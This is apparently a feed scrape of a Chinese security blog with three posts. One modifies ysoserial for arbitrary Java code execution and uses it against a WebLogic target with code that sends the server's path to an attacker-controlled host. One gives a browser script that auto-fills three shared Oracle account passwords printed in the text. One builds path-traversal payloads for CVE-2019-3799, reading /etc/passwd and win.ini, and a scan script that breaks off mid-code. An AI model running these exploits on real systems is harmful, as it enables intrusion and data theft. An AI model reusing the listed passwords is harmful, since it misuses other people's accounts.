class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    <span class="comment">// Code by c0ny1</span></span><br><span class="line">    <span class="comment">// email: root@gv7.me</span></span><br><span class="line">    <span class="comment">// date: 2019-04-29</span></span><br><span class="line">    <span class="comment">// From: https://www.cnblogs.com/0201zcr/p/5009975.html</span></span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line">    String cmd = <span class="string">""</span>;</span><br><span class="line">    <span class="keyword">if</span>(command.startsWith(<span class="string">"code:"</span>)) &#123;</span><br><span class="line">        cmd = command.substring(<span class="number">5</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codebase64:"</span>))&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] decode = <span class="keyword">new</span> BASE64Decoder().decodeBuffer(command.substring(<span class="number">11</span>));</span><br><span class="line">        cmd = <span class="keyword">new</span> String(decode);</span><br><span class="line">        cmd = <span class="keyword">new</span> URLDecoder().decode(cmd);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(command.startsWith(<span class="string">"codefile:"</span>))&#123;</span><br><span class="line">        String codefile = command.substring(<span class="number">9</span>);</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            File file = <span class="keyword">new</span> File(codefile);</span><br><span class="line">            <span class="keyword">if</span>(file.exists())&#123;</span><br><span class="line">                FileReader reader = <span class="keyword">new</span> FileReader(file);</span><br><span class="line">                BufferedReader br = <span class="keyword">new</span> BufferedReader(reader);</span><br><span class="line">                StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="string">""</span>);</span><br><span class="line">                String line = <span class="string">""</span>;</span><br><span class="line">                <span class="keyword">while</span> ((line = br.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    sb.append(line);</span><br><span class="line">                    sb.append(<span class="string">"\r\n"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                cmd = sb.toString();</span><br><span class="line">            &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                System.err.println(String.format(<span class="string">"[-] %s is not exists!"</span>,codefile));</span><br><span class="line">                System.exit(<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        cmd = <span class="string">"java.lang.Runtime.getRuntime().exec(\""</span> +</span><br><span class="line">            command.replaceAll(<span class="string">"\\\\"</span>, <span class="string">"\\\\\\\\"</span>).replaceAll(<span class="string">"\""</span>, <span class="string">"\\\""</span>) +</span><br><span class="line">            <span class="string">"\");"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    System.err.println(<span class="string">"----------------------------------Java code start----------------------------------"</span>);</span><br><span class="line">    System.err.println(cmd);</span><br><span class="line">    System.err.println(<span class="string">"-----------------------------------Java code end-----------------------------------"</span>);</span><br><span class="line">    <span class="comment">////////////////////////////////////////////////////////////////////////////////////////////////////////</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    clazz.makeClassInitializer().insertAfter(cmd);</span><br><span class="line">    <span class="comment">// sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)</span></span><br><span class="line">    clazz.setName(<span class="string">"ysoserial.Pwner"</span> + System.nanoTime());</span><br><span class="line">    CtClass superC = pool.get(abstTranslet.getName());</span><br><span class="line">    clazz.setSuperclass(superC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">byte</span>[] classBytes = clazz.toBytecode();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// inject class bytes into instance</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_bytecodes"</span>, <span class="keyword">new</span> <span class="keyword">byte</span>[][] &#123;</span><br><span class="line">        classBytes, ClassFiles.classAsBytes(Foo.class)</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// required to make TemplatesImpl happy</span></span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_name"</span>, <span class="string">"Pwnr"</span>);</span><br><span class="line">    Reflections.setFieldValue(templates, <span class="string">"_tfactory"</span>, transFactory.newInstance());</span><br><span class="line">    <span class="keyword">return</span> templates;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>修改完代码后，我们重新将其打包为ysoserial-0.0.6.1-custom-code-exec.jar，就可以使用可指定自定义代码的ysoserial了。需要我编译好的jar，请公众号后台回复“ysoserial可指定任意代码版本”获取。</p><p>注意:只有以下payload支持指定支持任意代码执行，其他paylaod需要手工修改其代码，因为它们没有调用我们修改的<code>Gadgets.createTemplatesImpl</code>方法。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/call.png" alt="调用了createTemplatesImpl方法的payload"></p><h2 id="0x04-案例"><a href="#0x04-案例" class="headerlink" title="0x04 案例"></a>0x04 案例</h2><p>下面举一个“不痛不痒”的例子，来展现其高自由度。</p><p>假设我们有个需求是这样的，获取目标系统的web物理路径，如果目标能访问我们服务器就把信息提交到服务器的web服务上。如果不能，就把信息写到目标自己的web目录下。如果你使用命令在实现，是比较费劲的，但是用代码就轻而易举！</p><p><strong>custiom-code.java</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">String HOST = <span class="string">"http://192.168.149.1:1665"</span>;</span><br><span class="line">String WEB_PATH = System.getProperty(<span class="string">"user.dir"</span>);</span><br><span class="line"></span><br><span class="line">String str_url = HOST + <span class="string">"/?info="</span> + WEB_PATH;</span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">    <span class="comment">//若目标能访问我们的服务器，则发送信息到服务器上</span></span><br><span class="line">    java.net.URL url = <span class="keyword">new</span> java.net.URL(str_url);</span><br><span class="line">    java.net.URLConnection conn = url.openConnection();</span><br><span class="line">    conn.connect();</span><br><span class="line">    conn.getContent();</span><br><span class="line">&#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">    <span class="comment">//若目标不能访问我们的服务器，则将信息写到自己的web目录下info.log文件中</span></span><br><span class="line">    String webPath = WEB_PATH + <span class="string">"/servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/info.log"</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        java.io.FileOutputStream f1 = <span class="keyword">new</span> java.io.FileOutputStream(webPath);</span><br><span class="line">        f1.write(WEB_PATH.getBytes());</span><br><span class="line">        f1.close();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e1) &#123;</span><br><span class="line">        e1.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里我利用CNVD-C-2019-48814这个漏洞，让远程服务器（192.168.149.142）加载我本机rmi服务（192.168.149.1:1664），我的rmi服务指定执行的代码，是我们编写好的custom-code.java。具体命令如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -cp ysoserial-0.0.6.1-custom-code-exec.jar ysoserial.exploit.JRMPListener 1664 Jdk7u21 &quot;codefile:custom-code.java&quot;</span><br></pre></td></tr></table></figure><p>通过测试发现，在本机启动web服务（92.168.149.1:1665），且目标可访问时，可成功接收信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/server_info.png" alt="服务器成功接收到信息"></p><p>然后我把服务器web服务停止了，目标自然无法访问。结果在目标系统的web目录下成功生成了文件，保存着我们要采集的信息。</p><p><img src="/articles/2019/enable-ysoserial-to-support-execution-of-custom-code/txt_info.png" alt="目标web目录下成功生成包含信息的文件"></p><p>从任意命令执行变成任意代码执行，在我看来危害增大了不少。在命令执行getshell受阻时，如何通过代码执行突破呢，到这里懂的人自然懂了。</p><h2 id="0x05-参考文章"><a href="#0x05-参考文章" class="headerlink" title="0x05 参考文章"></a>0x05 参考文章</h2><ul><li><a href="https://blog.csdn.net/fnmsd/article/details/79534877" target="_blank" rel="noopener">修改ysoserial使其支持生成代码执行Payload</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;修改ysoserial代码，可使其支持执行自定义代码，是在一次与Bearcat师傅聊天时提到的。当时觉得眼前一亮，感觉在命令执行受阻时，也许可以通过代码执行达到目的。后面去查资料找到了fnmsd师傅的文章，解决了实现该想法的疑问。在此感谢两位师傅给我的启发。&lt;/p&gt;
    
    </summary>
    
      <category term="安全开发" scheme="http://gv7.me/categories/%E5%AE%89%E5%85%A8%E5%BC%80%E5%8F%91/"/>
    
    
  </entry>
  
  <entry>
    <title>编写油猴脚本，实现自动登录下载Oracle产品</title>
    <link href="http://gv7.me/articles/2019/oracle-download-auto-login-tampermonkey-script/"/>
    <id>http://gv7.me/articles/2019/oracle-download-auto-login-tampermonkey-script/</id>
    <published>2019-05-05T04:33:06.000Z</published>
    <updated>2019-05-10T05:18:18.000Z</updated>
    
    <content type="html"><![CDATA[<p>研究Java漏洞的爱好者，不免要经常去Oracle官网下载各种版本的Java JDK，Weblogic等。我们都知道，Oracle相关产品是需要登录才能下载的。这就意味着你要注册个账号，并且每次下载都要登录，这很繁琐！空闲时简单写了个自动化油猴脚本，无需人工注册和登录即可下载。</p><h2 id="0x01-收集公开账号密码"><a href="#0x01-收集公开账号密码" class="headerlink" title="0x01 收集公开账号密码"></a>0x01 收集公开账号密码</h2><p>网上有很多大佬使用自己邮箱注册了Oracle的账号，并公开了密码，方便大家下载使用，在此感谢他们无私奉献。以下是我收集到的（可成功登录）：</p><blockquote><p><a href="mailto:1772885836@qq.com" target="_blank" rel="noopener">1772885836@qq.com</a><br>OracleTest1234</p><p><a href="mailto:541509124@qq.com" target="_blank" rel="noopener">541509124@qq.com</a><br>LR4ever.1314</p><p><a href="mailto:2696671285@qq.com" target="_blank" rel="noopener">2696671285@qq.com</a><br>Oracle123</p></blockquote><h2 id="0x02-编写油猴脚本"><a href="#0x02-编写油猴脚本" class="headerlink" title="0x02 编写油猴脚本"></a>0x02 编写油猴脚本</h2><p>油猴脚本的功能是在<code>https://login.oracle.com/mysso/signon.jsp</code>页面，自动完成以下操作。将我们上面收集到的账号密码，填写到Oracle单点登录页面的表单中，最后点击登录，完成下载。具体实现我在源码中已经注释得很清楚了。</p><p>我设置了一个变量<code>is_auto_login</code>，默认值为<code>true</code>，就是默认会自动输入账号密码并点击登录。如果你想让脚本只自动填写账号密码不自动点登录，请将其设置<code>false</code>！</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ==UserScript==</span></span><br><span class="line"><span class="comment">// @name         Oracle download auto login</span></span><br><span class="line"><span class="comment">// @namespace    http://gv7.me</span></span><br><span class="line"><span class="comment">// @version      0.1</span></span><br><span class="line"><span class="comment">// @description  自动登录Oracle官网，方便下载Oracle的各种产品，比如:Java JDK,Weblogic等</span></span><br><span class="line"><span class="comment">// @author       c0ny1</span></span><br><span class="line"><span class="comment">// @match        https://login.oracle.com/mysso/signon.jsp</span></span><br><span class="line"><span class="comment">// @grant        none</span></span><br><span class="line"><span class="comment">// ==/UserScript==</span></span><br><span class="line"></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="meta">    'use strict'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">var</span> is_auto_login = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">//获取随机数</span></span><br><span class="line">     <span class="function"><span class="keyword">function</span> <span class="title">random</span>(<span class="params">lower, upper</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">Math</span>.floor(<span class="built_in">Math</span>.random() * (upper - lower)) + lower;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//通过标签名，属性名和属性值来定位元素</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">getTargetByTAV</span>(<span class="params">t_tag,t_attr,t_value</span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> target = <span class="built_in">document</span>.getElementsByTagName(t_tag);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i &lt;target.length;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(target[i].getAttribute(t_attr) == t_value)&#123;</span><br><span class="line">                <span class="keyword">return</span> target[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">   <span class="comment">//存储账号密码</span></span><br><span class="line">    <span class="keyword">var</span> users = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    <span class="keyword">var</span> passs = <span class="keyword">new</span> <span class="built_in">Array</span>(<span class="number">3</span>);</span><br><span class="line">    users[<span class="number">0</span>] = <span class="string">"1772885836@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">0</span>] = <span class="string">"OracleTest1234"</span>;</span><br><span class="line">    users[<span class="number">1</span>] = <span class="string">"541509124@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">1</span>] = <span class="string">"LR4ever.1314"</span>;</span><br><span class="line">    users[<span class="number">2</span>] = <span class="string">"2696671285@qq.com"</span>;</span><br><span class="line">    passs[<span class="number">2</span>] = <span class="string">"Oracle123"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//随机获取一个账号密码，并将其填入登录表单中</span></span><br><span class="line">    <span class="keyword">var</span> sso_username = <span class="built_in">document</span>.getElementById(<span class="string">"sso_username"</span>);</span><br><span class="line">    <span class="keyword">var</span> sso_password = <span class="built_in">document</span>.getElementById(<span class="string">"ssopassword"</span>);</span><br><span class="line">    <span class="keyword">var</span> i = random(<span class="number">0</span>,users.length - <span class="number">1</span>);</span><br><span class="line">    sso_username.value = users[i];</span><br><span class="line">    sso_password.value = passs[i];</span><br><span class="line"></span><br><span class="line">    <span class="comment">//是否自动点击登录</span></span><br><span class="line">    <span class="keyword">if</span>(is_auto_login)&#123;</span><br><span class="line">        <span class="keyword">var</span> btn_login = getTargetByTAV(<span class="string">"input"</span>,<span class="string">"tabindex"</span>,<span class="number">3</span>);</span><br><span class="line">        btn_login.click();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><h2 id="0x03-脚本效果演示"><a href="#0x03-脚本效果演示" class="headerlink" title="0x03 脚本效果演示"></a>0x03 脚本效果演示</h2><p><img src="/articles/2019/oracle-download-auto-login-tampermonkey-script/oracle-download-auto-login.gif" alt="效果演示"></p><p>脚本已经上传Greasy Fork，需要的自行安装。</p><p><a href="https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login" target="_blank" rel="noopener">https://greasyfork.org/zh-CN/scripts/382627-oracle-download-auto-login</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;研究Java漏洞的爱好者，不免要经常去Oracle官网下载各种版本的Java JDK，Weblogic等。我们都知道，Oracle相关产品是需要登录才能下载的。这就意味着你要注册个账号，并且每次下载都要登录，这很繁琐！空闲时简单写了个自动化油猴脚本，无需人工注册和登录即可下
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>编写Spring Cloud Config Server路径穿越漏洞全面检测脚本</title>
    <link href="http://gv7.me/articles/2019/write-cve-2019-3799-batch-scan-script/"/>
    <id>http://gv7.me/articles/2019/write-cve-2019-3799-batch-scan-script/</id>
    <published>2019-04-20T11:12:55.000Z</published>
    <updated>2019-04-21T06:27:20.000Z</updated>
    
    <content type="html"><![CDATA[<p>Spring Cloud Config Server路径穿越漏洞（CVE-2019-3799）的分析文章已经很多了，这里我不在画蛇填足。在分析该漏洞之后，发现了一些小细节，感觉对该漏洞检测还是挺有帮助的。基于发现的这些细节，我们来构造适应各种场景，甚至各种奇葩场景的批量检测脚本！</p><a id="more"></a><h2 id="0x01-简洁原理"><a href="#0x01-简洁原理" class="headerlink" title="0x01 简洁原理"></a>0x01 简洁原理</h2><p>Spring cloud config 分客户端和服务端。服务端供客户端查询配置，本次漏洞就是出在服务端。</p><p>当客户端提交的访问配置请求，会在服务端被解析为以下2种：</p><ul><li><a href="http://xxx:8888/{name}/{profile}/{label}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{label}/{path}</a></li><li><a href="http://xxx:8888/{name}/{profile}/{path}" target="_blank" rel="noopener">http://xxx:8888/{name}/{profile}/{path}</a></li></ul><p>配置文件保存在服务端系统临时文件<code>{system_tmp_path}</code>下。在需要获取目标配置文件绝对路径时，服务端会将客户端提供的相对路径<code>{path}</code>和系统临时文件目录<code>{system_tmp_path}</code>进行拼接。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">config_file_path = &#123;system_tmp_path&#125; + &#123;path&#125;</span><br></pre></td></tr></table></figure><p>由于<code>{path}</code>客户端可控且未过滤<code>../</code>，从而导致目录穿越，可读服务端机器上任意文件！</p><h2 id="0x02-漏洞检测点"><a href="#0x02-漏洞检测点" class="headerlink" title="0x02 漏洞检测点"></a>0x02 漏洞检测点</h2><p>经过分析代码，可以发现，其实该漏洞有三个检查点。不过网上大多数文章提供的漏洞url只是第一处。</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/ResourceController_retrieve.png" alt="第一第二处"></p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/EnvironmentController_binary.png" alt="第三处"></p><p>我们先看看第一处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(&quot;/&#123;name&#125;/&#123;profile&#125;/&#123;label&#125;/**&quot;)</span><br></pre></td></tr></table></figure><p>这里<code>name</code>为应仓库名称,<code>profile</code>为应配置文件环境<code>label</code>为git分支名。实际测试中需要<code>label</code>为存在的分支名（一般git仓库都存在<code>master</code>分支），否则报错，<code>name</code>和<code>profile</code>可以为任意。由此我们可以构造如下url，即可匹配到该<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/aaa/bbb/master/&#123;payload&#125;</span><br></pre></td></tr></table></figure><p>我们接着来看第二处<code>@RequestMapping</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@RequestMapping(value = &quot;/&#123;name&#125;/&#123;profile&#125;/**&quot;, params = &quot;useDefaultLabel&quot;)</span><br></pre></td></tr></table></figure><p>根据Spring的RequestMapping匹配规则我们很容易构造以下url</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>实际上我们构造的url虽然会被该<code>@RequestMapping</code>匹配到，但并不会执行该注解处代码。而是执行了以下注解处代码。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//org/springframework/cloud/config/server/environment/EnvironmentController.java</span></span><br><span class="line"><span class="meta">@RequestMapping</span>(<span class="string">"/&#123;name&#125;/&#123;profiles&#125;/&#123;label:.*&#125;"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> Environment <span class="title">labelled</span><span class="params">(...)</span> </span>&#123;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是因为我们构造的url，都符合两处注解的匹配规则，但后者匹配度更好优先级更高（<code>*</code>优先级大于<code>**</code>），自然优先被框架用于处理请求了。</p><p>因此我们可以构造以下链接，让第一个注解匹配度最高，使得程序使用存在漏洞的方法来处理。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx.com:8888/aaa/bbb/ccc/&#123;payload&#125;?useDefaultLabel=1</span><br></pre></td></tr></table></figure><p>第三处，和第一处构造的url一样的，需要在数据包Accept头加入<code>application/octet-stream</code>即可触发！</p><p><img src="/articles/2019/write-cve-2019-3799-batch-scan-script/poc_3.png" alt></p><h2 id="0x03-目标操作系统"><a href="#0x03-目标操作系统" class="headerlink" title="0x03 目标操作系统"></a>0x03 目标操作系统</h2><p>在黑盒渗透测试时，无法确定目标系统是Windows还是Linux，故最稳妥的方法是构造适合两者的payload，都检测一篇。</p><ul><li>Linux下读<code>/etc/passwd</code>，检查关键字为<code>root:</code></li><li>Window下读<code>c:/Windows/win.ini</code>,检查关键字为<code>[extensions]</code></li></ul><p>注意： <strong>在Windows下该漏洞无法跨盘符读文件，也就是只能读和系统临时文件夹同盘符的任意路径下任意文件。</strong> 所以在Windwos系统下，系统临时文件路径被修改（这种情况比较少），即使目标存在漏洞，我们的payload也无法检测的，目前暂时没有好的解决方案。</p><h2 id="0x04-25F的个数"><a href="#0x04-25F的个数" class="headerlink" title="0x04 ..%25F的个数"></a>0x04 ..%25F的个数</h2><p><code>..%252F</code>是<code>../</code>的两次URL编码后结果，它是路径穿越的关键，其个数取决于系统临时文件目录的深度。</p><h4 id="3-1-默认情况"><a href="#3-1-默认情况" class="headerlink" title="3.1 默认情况"></a>3.1 默认情况</h4><p>这里的默认情况是指，服务端系统临时目录采用的是默认路径。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Windows系统临时文件存储路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/</span><br><span class="line">Windows下Spring cloud config server存储配置路径：</span><br><span class="line">file:/C:/Users/ADMINI~1/AppData/Local/Temp/config-repo-&lt;randomid&gt;/</span><br><span class="line">Linux系统临时文件存储路径：</span><br><span class="line">/tmp/</span><br><span class="line">Linux下Spring cloud config server存储配置路径：</span><br><span class="line">/tmp/config-repo-&lt;randomid&gt;/</span><br></pre></td></tr></table></figure><p>所以要吃掉所有配置路径，Windwos下第一处漏洞检测需要6个<code>..%252F</code>,第二处需要7个，第三处需要6个。Linux下第一处2个，第二处需要3个，第三处需要6个。</p><h4 id="3-2-极端情况"><a href="#3-2-极端情况" class="headerlink" title="3.2 极端情况"></a>3.2 极端情况</h4><p>这里的极端情况是指，服务端系统临时目录被管理员自定义为其他路径，路径深度未知。这时我们可以估计一个最大深度50（相信不会有管理员奇葩到设置更深的目录了）</p><p>综合以上各个方面的分析，我们就可以构造出如下8个POC来检查，以应对各种情况该漏洞的检测。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*2 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*6 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + etc%252Fpasswd</span><br><span class="line">http://xxx:8888/a/b/master/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*3 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*7 + Windows%252Fwin.ini?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + etc%252Fpasswd?useDefaultLabel=a</span><br><span class="line">http://xxx:8888/a/b/c/ + &#123;..%252F&#125;*50 + Windows%252Fwin.ini?useDefaultLabel=a</span><br></pre></td></tr></table></figure><h2 id="0x05-批量检测脚本"><a href="#0x05-批量检测脚本" class="headerlink" title="0x05 批量检测脚本"></a>0x05 批量检测脚本</h2><p>下面附上我写的POC-T插件，这里说明下本脚本仅供自查和学习使用，请勿用于非法用途，否则后果自负。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding=utf-8</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">Autor: c0ny1</span></span><br><span class="line"><span class="string">Date: 2019-04-20 16:41</span></span><br><span class="line"><span class="string">Description: Directory Traversal with spring-cloud-config-server(CVE-2019-3799)</span></span><br><span class="line"><span class="string">Affected Pivotal Products and Versions:</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.1.0 to 2.1.1</span></span><br><span class="line"><span class="string">Spring Cloud Config 2.0.0 to 2.0.3</span></span><br><span class="line"><span class="string">Spring Cloud Config 1.4.0 to 1.4.5</span></span><br><span class="line"><span class="string">Older unsupported versions are also affected</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> requests <span class="keyword">import</span> ConnectionError</span><br><span class="line"></span><br><span class="line">WIN_CHECK_KEYWORD = <span class="string">'[extensions]'</span></span><br><span class="line">LINUX_CHECK_KEYWORD = <span class="string">'root:'</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_poc</span><span class="params">()</span>:</span></span><br><span class="line">pocs = []</span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">2</span> + <span class="string">'etc%252Fpasswd'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:LINUX_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">6</span> + <span class="string">'Windows%252Fwin.ini'</span></span><br><span class="line">poc = &#123;<span class="string">'payload'</span>:payload,<span class="string">'keyword'</span>:WIN_CHECK_KEYWORD&#125;</span><br><span class="line">pocs.append(poc)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">'/a/b/master/'</span> + <span class="string">'..%252F'</span>*<span class="number">50</span> + <span 